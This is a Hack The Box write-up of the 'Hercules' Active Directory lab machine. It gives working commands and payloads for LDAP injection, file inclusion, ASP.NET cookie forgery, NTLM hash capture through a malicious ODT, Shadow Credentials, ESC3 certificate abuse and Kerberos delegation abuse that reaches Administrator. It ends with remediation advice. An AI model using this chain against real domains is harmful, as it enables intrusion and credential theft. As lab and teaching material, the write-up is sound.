# Hercules — Hack The Box

![Hercules](../images/Hercules.png)

**Machine:** Hercules  
**Difficulty:** Insane  
**OS:** Windows (Active Directory)  
**Tags:** Active Directory, LDAP Injection, ASP.NET, Shadow Credentials, AD CS, ESC3, Kerberos Delegation, S4U2self/S4U2proxy

---

## Table of Contents

1. [Summary](#summary)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Initial Access](#initial-access)
5. [Lateral Movement - Part 1](#lateral-movement---part-1)
6. [Lateral Movement - Part 2](#lateral-movement---part-2)
7. [Advanced Exploitation](#advanced-exploitation)
8. [Root Access](#root-access)
9. [Summary of Exploits](#summary-of-exploits)
10. [Remediation](#remediation)
11. [Tools](#tools)

---

## Summary

Hercules is an Insane-difficulty Active Directory machine that demonstrates a complex multi-stage attack chain involving LDAP injection, ASP.NET cookie forgery, Shadow Credentials attacks, Active Directory Certificate Services (AD CS) exploitation (ESC3), and Kerberos delegation abuse (S4U2self/S4U2proxy). The attack path progresses from web application vulnerabilities through multiple lateral movement techniques, ultimately achieving domain administrator access through sophisticated AD exploitation.

**Attack Path:**  
LDAP Injection → Web Access → LFI + Cookie Forging → Privileged Web Access → Malicious ODT Upload → Hash Capture → Shadow Credentials → OU Manipulation → ESC3 Certificate Attack → S4U2self/S4U2proxy → Domain Administrator

---

## Reconnaissance

### Port Scanning

Initial full port scan to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP> -oG allPorts
```

**Key Ports Discovered:**
- 53/tcp - DNS
- 80/tcp - HTTP (redirects to HTTPS)
- 88/tcp - Kerberos
- 135/tcp - MSRPC
- 139/tcp - NetBIOS-SSN
- 389/tcp - LDAP
- 443/tcp - HTTPS
- 445/tcp - SMB
- 464/tcp - Kerberos Password Change
- 636/tcp - LDAPS
- 3268/tcp - Global Catalog
- 5986/tcp - WinRM over SSL

### Service Enumeration

Detailed service and version detection:

```bash
nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5986,9389 <TARGET_IP> -oN targeted
```

**Key Findings:**
- **Domain:** hercules.htb
- **Domain Controller:** dc.hercules.htb
- **Web Server:** Microsoft IIS 10.0
- **AD CS:** Active Directory Certificate Services detected
- **WinRM:** Enabled on port 5986 (SSL)

**Host File Configuration:**

```bash
echo "<TARGET_IP> hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### Web Application Analysis

#### HTTPS Service (Port 443)

Accessed `https://hercules.htb` and discovered:
- Corporate website for Hercules Corp
- Login portal at `/login`
- Technology stack: ASP.NET with Forms Authentication
- Rate limiting warning on failed login attempts

#### Directory Enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ \
     -u https://hercules.htb/FUZZ -t 300 -fs 0
```

**Discovered Endpoints:**
- `/login` - Authentication portal
- `/home` - Dashboard (requires authentication)
- `/content` - Static resources

### Kerberos User Enumeration

Created custom wordlist following Active Directory naming convention:

```bash
# Generate username combinations: firstname.lastInitial
awk 'NF{ for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' \
    /usr/share/wordlists/seclists/Usernames/Names/names.txt > names_ad.txt
```

Enumerated valid users with kerbrute:

```bash
kerbrute userenum --dc <TARGET_IP> -d hercules.htb names_ad.txt -t 150
```

**Valid Users Discovered:** Multiple domain users identified (redacted for security)

---

## Initial Access

### LDAP Injection Attack

#### Vulnerability Discovery

The login form at `/login` was vulnerable to LDAP injection. Testing revealed:

1. Application uses LDAP for authentication backend
2. Username field lacks proper input sanitization
3. LDAP filter structure: `(&(sAMAccountName=INPUT)(password=INPUT))`

#### Exploitation Strategy

**LDAP Injection Payloads:**

```
username*)(description=*
username*)(password=*
```

These payloads revealed the application validates against the `description` attribute, which may contain sensitive information.

#### Automated Password Extraction

Created Python script to extract passwords from user description fields using LDAP injection. The script:

1. Enumerates characters in user description fields
2. Uses LDAP injection to extract password information
3. Handles rate limiting and special character escaping

**Credentials Discovered:** Multiple user credentials extracted (redacted for security)

#### Password Spraying

The discovered password was tested against all enumerated users:

```bash
netexec ldap <TARGET_IP> -u [USER_LIST] -p '[REDACTED_PASSWORD]' -k --continue-on-success
```

**Valid Credentials Found:** Multiple users with shared password (redacted)

### Web Application Exploitation

#### Authentication Bypass via LFI

After logging in, discovered Local File Inclusion vulnerability:

```
https://hercules.htb/Home/Download?fileName=../../web.config
```

**Extracted Sensitive Information:**

```xml
<machineKey 
    validationKey="[REDACTED]"
    decryptionKey="[REDACTED]"
    validation="HMACSHA256"
    decryption="AES"
/>
```

#### Cookie Forging for Privilege Escalation

**Objective:** Forge ASP.NET authentication cookie to impersonate `web_admin` user

**Prerequisites:**
- .NET SDK installed
- machineKey values (obtained from web.config)

**Cookie Generation:**

Used .NET SDK with `AspNetCore.LegacyAuthCookieCompat` package to generate forged authentication cookies. The process involved:

1. Creating a .NET console project
2. Using machineKey values to encrypt FormsAuthenticationTicket
3. Generating valid authentication cookie for `web_admin` user

**Cookie Implementation:**
1. Open browser Developer Tools (F12)
2. Navigate to Storage/Application → Cookies
3. Replace `.ASPXAUTH` cookie value with forged cookie
4. Refresh page

**Result:** Successfully authenticated as `web_admin` user

---

## Lateral Movement - Part 1

### Hash Capture via Malicious ODT

#### Discovering File Upload Functionality

As `web_admin`, discovered file upload feature at `/Home/UploadReport`

**File Type Discovery:**

Used BurpSuite Intruder to identify accepted file extensions:
- Discovered `.odt` (OpenDocument Text) format accepted

#### Creating Malicious ODT File

**Tool:** Bad-ODF.py

**Generate Malicious ODT:**

```bash
python3 Bad-ODF.py
# Enter attacker IP when prompted
```

This creates `bad.odt` with embedded UNC path pointing to attacker's IP.

#### Capturing NTLMv2 Hash

**Start Responder:**

```bash
sudo responder -I [INTERFACE]
```

**Upload malicious ODT through web interface**

**Hash Captured:** NTLMv2 hash for domain user (redacted)

#### Cracking the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt [HASH_FILE]
```

**Credentials Obtained:** Domain user credentials (redacted)

**Verification:**

```bash
netexec ldap <TARGET_IP> -u '[USERNAME]' -p '[REDACTED_PASSWORD]' -k
```

### Shadow Credentials Attack

#### BloodHound Enumeration

**Data Collection:**

```bash
bloodhound-python -u [USERNAME] -p '[REDACTED_PASSWORD]' -c All -d hercules.htb \
                  -ns <TARGET_IP> --zip --use-ldap
```

**Key Findings:**
- User has `GenericWrite` permissions on multiple users
- Certificate-based authentication is enabled (Shadow Credentials possible)
- Multiple privilege escalation paths identified

#### Exploiting Shadow Credentials

**Critical Note:** Always sync time before Kerberos operations

```bash
# Sync time with DC
sudo ntpdate -b dc.hercules.htb
```

**Create TGT:**

```bash
impacket-getTGT -dc-ip <TARGET_IP> hercules.htb/[USERNAME]:'[REDACTED_PASSWORD]'
```

**Execute Shadow Credentials Attack:**

```bash
# Sync time
sudo ntpdate -b dc.hercules.htb

# Perform attack
KRB5CCNAME=[USERNAME].ccache python3 -m certipy.entry shadow auto \
    -username [USERNAME]@hercules.htb \
    -target dc.hercules.htb \
    -dc-ip <TARGET_IP> \
    -account [TARGET_USER] \
    -k
```

**Obtained:** NT hash and TGT for target user (redacted)

---

## Lateral Movement - Part 2

### OU Manipulation

#### Analyzing Privileges

**Using bloodyAD:**

```bash
# Sync time first
sudo ntpdate -b dc.hercules.htb

# Enumerate writable objects
KRB5CCNAME=[USER].ccache bloodyAD -u '[USER]' -p '' -d 'hercules.htb' \
    --host DC.hercules.htb --use-ldaps get writable --detail -k
```

**Key Findings:**
- User has `CREATE_CHILD` on multiple OUs
- User has `WRITE` permissions on userCertificate attributes
- Web Department OU has most permissive ACLs for Shadow Credentials

#### Target Analysis

**Objective:** Move target user to Web Department to inherit permissive ACLs

#### Moving User to Web Department

**Using PowerView.py:**

**Connect to LDAPS:**

```bash
# Sync time
sudo ntpdate -b dc.hercules.htb

# Connect
KRB5CCNAME=[USER].ccache powerview hercules.htb/[USER]@dc.hercules.htb \
    -k --use-ldaps -d --no-pass
```

**Move User:**

```powershell
Set-DomainObjectDN -Identity [TARGET_USER] \
    -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
```

**Note:** The cleanup script may revert this change. If user returns to original OU, repeat the move operation.

### Privilege Escalation to Auditor

#### Shadow Credentials on Target User

```bash
# Sync time
sudo ntpdate -b dc.hercules.htb

# Use credentials to perform Shadow Credentials on target user
KRB5CCNAME=[USER].ccache python3 -m certipy.entry shadow auto \
    -username [USER]@hercules.htb \
    -target dc.hercules.htb \
    -dc-ip <TARGET_IP> \
    -account [TARGET_USER] \
    -k
```

**Obtained:** NT hash and TGT for target user (redacted)

#### Changing Auditor's Password

**Using bloodyAD:**

```bash
# Create TGT
impacket-getTGT HERCULES.HTB/[USER] -hashes :[REDACTED_NT_HASH]

# Sync time
sudo ntpdate -b dc.hercules.htb

# Change auditor's password
KRB5CCNAME=[USER].ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u '[USER]' -k \
    set password Auditor '[NEW_PASSWORD]'
```

#### Gaining Access as Auditor

```bash
# Create TGT
impacket-getTGT -dc-ip <TARGET_IP> hercules.htb/Auditor:'[NEW_PASSWORD]'

# Connect via WinRM
KRB5CCNAME=Auditor.ccache python3 [WINRM_TOOL] \
    -ssl -port 5986 -k -no-pass dc.hercules.htb
```

**User Flag:**

```powershell
PS C:\Users\auditor\Desktop> type user.txt
HTB{redacted}
```

---

## Advanced Exploitation

### ESC3 Certificate Attack

#### Taking Ownership of Forest Migration OU

**Grant GenericAll to Auditor:**

```bash
# Sync time
sudo ntpdate -b dc.hercules.htb

# Set ownership
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u Auditor -k \
    set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor

# Add GenericAll permission
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u Auditor -k \
    add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

#### Enabling Target Account

**Enable Account:**

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u 'Auditor' -k \
    remove uac '[TARGET_USER]' -f ACCOUNTDISABLE
```

**Set Password:**

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u Auditor -k \
    set password '[TARGET_USER]' '[NEW_PASSWORD]'
```

#### ESC3: Enrollment Agent Attack

**Enumerate Vulnerable Certificate Templates:**

```bash
KRB5CCNAME=[USER].ccache certipy-ad find \
    -k -dc-ip <TARGET_IP> \
    -target DC.hercules.htb \
    -vulnerable -stdout
```

**Vulnerable Templates Found:**
- `EnrollmentAgent` (ESC3)
- `EnrollmentAgentOffline` (ESC3 + ESC15)
- `MachineEnrollmentAgent` (ESC3)

#### Requesting Enrollment Agent Certificate

```bash
# Sync time
sudo ntpdate -b dc.hercules.htb

# Request Enrollment Agent certificate
KRB5CCNAME=[USER].ccache certipy-ad req \
    -u "[USER]@hercules.htb" -k -no-pass \
    -dc-host dc.hercules.htb -dc-ip <TARGET_IP> \
    -target "dc.hercules.htb" \
    -ca '[CA_NAME]' \
    -template "EnrollmentAgent" \
    -application-policies "Certificate Request Agent"
```

#### Requesting Certificate on Behalf of Target User

```bash
# Request certificate as target user using Enrollment Agent cert
KRB5CCNAME=[USER].ccache certipy-ad req \
    -u "[USER]@hercules.htb" -k -no-pass \
    -dc-ip <TARGET_IP> -dc-host dc.hercules.htb \
    -target "dc.hercules.htb" \
    -ca "[CA_NAME]" \
    -template "User" \
    -pfx [USER].pfx \
    -on-behalf-of "HERCULES\\[TARGET_USER]" \
    -dcom
```

#### Authenticating as Target User

```bash
# Extract NT hash using certificate
certipy-ad auth -pfx [TARGET_USER].pfx -dc-ip <TARGET_IP>
```

**Obtained:** NT hash and TGT for target user (redacted)

---

## Root Access

### Service Account Compromise

#### Enabling Service Account

**Change Password:**

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u Auditor -k \
    set password "[SERVICE_ACCOUNT]" "[NEW_PASSWORD]"
```

**Enable Account:**

```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u 'Auditor' -k \
    remove uac "[SERVICE_ACCOUNT]" -f ACCOUNTDISABLE
```

#### Compromising Machine Account

**Change Machine Account Password:**

```bash
sudo ntpdate -b dc.hercules.htb

KRB5CCNAME=[SERVICE_ACCOUNT].ccache bloodyAD --host DC.hercules.htb \
    -d hercules.htb -u '[SERVICE_ACCOUNT]' -k \
    set password "[MACHINE_ACCOUNT$]" "[NEW_PASSWORD]"
```

**Create TGT for Machine Account:**

```bash
impacket-getTGT -hashes :[REDACTED_NT_HASH] 'hercules.htb/[MACHINE_ACCOUNT$]' -dc-ip <TARGET_IP>
```

### S4U2self/S4U2proxy Abuse Chain

#### Understanding the Attack

**Machine Account** has the following delegation rights:
- Allowed to delegate to: `CIFS/dc.hercules.htb`
- Delegation type: Constrained with Protocol Transition

This allows us to:
1. Request a service ticket for ANY user (S4U2self)
2. Use that ticket to access CIFS service as that user (S4U2proxy)

#### Requesting Administrator TGS

```bash
sudo ntpdate -b dc.hercules.htb

KRB5CCNAME=[MACHINE_ACCOUNT$].ccache impacket-getST \
    -u2u \
    -impersonate "Administrator" \
    -spn "cifs/dc.hercules.htb" \
    -k -no-pass \
    'hercules.htb'/'[MACHINE_ACCOUNT$]'
```

#### Accessing as Administrator

```bash
KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache \
    python3 [WINRM_TOOL] \
    -ssl -port 5986 -k -no-pass dc.hercules.htb
```

**Success:**

```powershell
PS C:\Users\Administrator\Documents> whoami
hercules\administrator

PS C:\Users\Admin\Desktop> type root.txt
HTB{redacted}
```

---

## Summary of Exploits

| Stage | Vulnerability | Technique | Result |
|-------|---------------|-----------|--------|
| 1 | LDAP Injection | Description field enumeration | User credentials |
| 2 | LFI | web.config extraction | MachineKey values |
| 3 | Cookie Forging | ASP.NET Forms Auth | web_admin access |
| 4 | Malicious ODT | NTLM hash capture | Domain user hash |
| 5 | Shadow Credentials | Key trust account mapping | Privileged user access |
| 6 | OU Manipulation | Move user to permissive OU | Enhanced permissions |
| 7 | ESC3 Certificate | Enrollment Agent abuse | Service account access |
| 8 | S4U2self/S4U2proxy | Kerberos delegation | Domain Administrator |

---

## Remediation

### Critical Security Issues

1. **LDAP Injection**
   - Implement strict input sanitization on all user inputs
   - Use parameterized LDAP queries
   - Never store passwords in user description fields
   - Validate and sanitize all LDAP filter inputs

2. **Local File Inclusion (LFI)**
   - Implement proper path validation
   - Use allowlists for file access
   - Store sensitive configuration outside web root
   - Encrypt machineKey values

3. **ASP.NET Cookie Forging**
   - Encrypt machineKey values in web.config
   - Use secure key management systems
   - Implement proper session management
   - Monitor for unusual authentication patterns

4. **Shadow Credentials Attack**
   - Regularly audit ACLs and permissions
   - Monitor for changes to msDS-KeyCredentialLink
   - Implement Protected Users group for sensitive accounts
   - Restrict GenericWrite/GenericAll permissions

5. **Active Directory Certificate Services (AD CS)**
   - Audit certificate template permissions
   - Disable vulnerable templates (ESC1-ESC15)
   - Implement certificate enrollment restrictions
   - Monitor for certificate-based authentication anomalies

6. **Kerberos Delegation Abuse**
   - Disable unconstrained delegation
   - Use constrained delegation only when necessary
   - Monitor for S4U2self/S4U2proxy usage
   - Implement Resource-Based Constrained Delegation (RBCD)

7. **OU Manipulation**
   - Monitor for OU changes
   - Restrict CREATE_CHILD permissions
   - Implement change tracking and alerts
   - Regular ACL audits

### Security Best Practices

- **Input Validation:** Implement strict input sanitization on all user inputs
- **Sensitive Data Handling:** Never store passwords in user description fields or other LDAP attributes
- **Active Directory Hardening:** Regularly audit ACLs and permissions, implement Protected Users group
- **Certificate Services Security:** Audit certificate template permissions, disable vulnerable templates
- **Monitoring and Detection:** Log and alert on OU changes, Shadow Credentials attacks, service account password changes
- **Network Segmentation:** Limit lateral movement through proper network design
- **Regular Security Assessments:** Conduct regular penetration testing and vulnerability assessments

---

## Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `kerbrute` | Kerberos user enumeration |
| `ffuf` | Web fuzzing and directory enumeration |
| `Burp Suite` | Web application testing |
| `Bad-ODF` | Malicious ODT creation |
| `Responder` | NTLM hash capture |
| `John the Ripper` | Password hash cracking |
| `BloodHound` | Active Directory enumeration |
| `bloodhound-python` | BloodHound data collection |
| `impacket` | AD exploitation toolkit |
| `certipy-ad` | AD CS exploitation |
| `bloodyAD` | AD privilege manipulation |
| `PowerView.py` | AD enumeration |
| `winrmexec` | WinRM client |

---

## References

- [LDAP Injection - OWASP](https://owasp.org/www-community/attacks/LDAP_Injection)
- [ASP.NET MachineKey Exploitation](https://www.netspi.com/blog/technical/web-application-penetration-testing/decrypting-asp-net-viewstate/)
- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Certified Pre-Owned - AD CS Abuse](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Kerberos Delegation Attacks](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [Active Directory Security](https://adsecurity.org/)

---

**Author:** Erviano Florentino Susanto  
**Platform:** Hack The Box  
**Difficulty:** Insane  
**Date:** Redacted

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
